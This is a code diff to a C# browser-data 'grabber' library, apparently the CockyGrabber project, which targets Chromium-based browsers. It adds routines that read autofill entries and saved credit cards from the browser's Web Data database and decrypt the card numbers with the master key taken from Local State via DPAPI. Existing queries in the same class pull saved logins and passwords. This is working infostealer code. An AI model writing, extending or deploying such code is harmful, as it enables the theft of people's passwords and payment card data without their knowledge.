@@ -17,12 +17,15 @@ namespace CockyGrabber.Grabbers
         private const string LoginCommandText = "SELECT origin_url,action_url,username_element,username_value,password_element,password_value,submit_element,signon_realm,date_created,blacklisted_by_user,scheme,password_type,times_used,form_data,display_name,icon_url,federation_url,skip_zero_click,generation_upload_status,possible_username_pairs,id,date_last_used,moving_blocked_for,date_password_modified FROM logins";
         private const string HistoryCommandText = "SELECT id,url,title,visit_count,typed_count,last_visit_time,hidden FROM urls";
         private const string DownloadCommandText = "SELECT id,guid,current_path,target_path,start_time,received_bytes,total_bytes,state,danger_type,interrupt_reason,hash,end_time,opened,last_access_time,transient,referrer,site_url,tab_url,tab_referrer_url,http_method,by_ext_id,by_ext_name,etag,last_modified,mime_type,original_mime_type,embedder_download_data FROM downloads";
+        private const string AutoFillsCommandText = "SELECT name,value FROM autofill";
+        private const string CreditCardsCommandText = "SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards";
         public virtual string CookiePath { get; set; }
         public virtual string LocalStatePath { get; set; }
         public virtual string LoginDataPath { get; set; }
         public virtual string HistoryPath { get; set; }
         public virtual string BookmarkPath { get; set; }
-
+        public virtual string WebDataPath { get; set; }
+        
         private readonly JavaScriptSerializer JSON_Serializer = new JavaScriptSerializer();
         public BlinkGrabber()
         {
@@ -74,6 +77,12 @@ namespace CockyGrabber.Grabbers
         /// <returns>True if the bookmarks exist</returns>
         public bool BookmarksExist() => File.Exists(BookmarkPath);
 
+        /// <summary>
+        /// Returns a value depending on if the database with the browser bookmarks was found
+        /// </summary>
+        /// <returns>True if the bookmarks exist</returns>
+        public bool WebDataExist() => File.Exists(WebDataPath);
+        
         /// <summary>
         /// Returns a value depending on if the database with the browser downloads was found
         /// </summary>
@@ -391,7 +400,87 @@ namespace CockyGrabber.Grabbers
             return history;
         }
         #endregion
+        public IEnumerable<Blink.AutoFill> GetAutoFills()
+        {
 
+            List<Blink.AutoFill> autoFills = new List<Blink.AutoFill>();
+            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the History DB was not found
+
+            // Copy the database to a temporary location because it could be already in use
+            string tempFile = CopyToTempFile(WebDataPath);
+
+            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = AutoFillsCommandText;
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        autoFills.Add(new Blink.AutoFill()
+                        {
+                            // Store retrieved information:
+                            //Id = reader.GetInt32(0),
+                            Name = reader.GetString(0),
+                            Value = reader.GetString(1),
+                           
+                        });
+                    }
+                }
+                conn.Close();
+            }
+            File.Delete(tempFile);
+
+            return autoFills;
+
+
+
+        }
+
+        public IEnumerable<Blink.CreditCard> GetCreditCards() => GetCreditCards(GetKey());
+        public IEnumerable<Blink.CreditCard> GetCreditCards(byte[] key) => GetCreditCards(new KeyParameter(key));
+        
+        public IEnumerable<Blink.CreditCard> GetCreditCards(KeyParameter key)
+        {
+
+            List<Blink.CreditCard> creditCards = new List<Blink.CreditCard>();
+            if (!WebDataExist()) throw new GrabberException(GrabberError.WebDataNotFound, $"The WebData database could not be found: {WebDataPath}"); // throw a Exception if the History DB was not found
+
+            // Copy the database to a temporary location because it could be already in use
+            string tempFile = CopyToTempFile(WebDataPath);
+
+            using (var conn = new SQLiteConnection($"Data Source={tempFile};pooling=false"))
+            using (var cmd = conn.CreateCommand())
+            {
+                cmd.CommandText = CreditCardsCommandText;
+
+                conn.Open();
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        creditCards.Add(new Blink.CreditCard()
+                        {
+                            // Store retrieved information:
+                            //Id = reader.GetInt32(0),
+                            Name = reader.GetString(0),
+                            Month = reader.GetInt32(1),
+                            Year = reader.GetInt32(2),
+                            Number = BlinkDecryptor.DecryptValue((byte[])reader[3], key),
+                        }); ;
+                    }
+                }
+                conn.Close();
+            }
+            File.Delete(tempFile);
+
+            return creditCards;
+
+
+
+        }
         #region GetBookmarks()
         /// <summary>
         /// Gets all bookmarks and those in subfolders from a dynamic json object
@@ -835,15 +924,12 @@ namespace CockyGrabber.Grabbers
         /// </summary>
         public byte[] GetKey()
         {
-            if (!KeyExists()) throw new GrabberException(GrabberError.LocalStateNotFound, $"The Key for decryption (Local State) could not be found: {LocalStatePath}"); // throw a Exception if the "Local State" file that stores the key for decryption was not found
+            if (!KeyExists())
+            {
+                throw new GrabberException(GrabberError.LocalStateNotFound, "The Key for decryption (Local State) could not be found: " + LocalStatePath);
+            }
 
-            // Get the encrypted master key from the "Local State" file with regular expressions:
-            string value = Regex.Match(File.ReadAllText(LocalStatePath), "\"os_crypt\"\\s*:\\s*{\\s*\"encrypted_key\"\\s*:\\s*\".*?\"\\s*}").Value;
-            value = value.Replace("\"os_crypt\"", null).Replace("\"encrypted_key\"", null);
-            value = Regex.Match(value, "\".*?\"").Value;
-            value = value.Substring(1, value.Length - 2);
-
-            return DPAPI.Decrypt(Convert.FromBase64String(value).Skip(5).ToArray()); // Return decrypted key
+            return DPAPI.Decrypt(Convert.FromBase64String(((Capture)Regex.Match(File.ReadAllText(LocalStatePath), "\"os_crypt\"\\s*:\\s*\\{\\s*.*?(?=\"encrypted_key)\"encrypted_key\"\\s*:\\s*\"(?<encKey>.*?)\"\\s*\\}").Groups["encKey"]).Value).Skip(5).ToArray());
         }
 
         // TimeStamp To DateTimeOffset Functions:
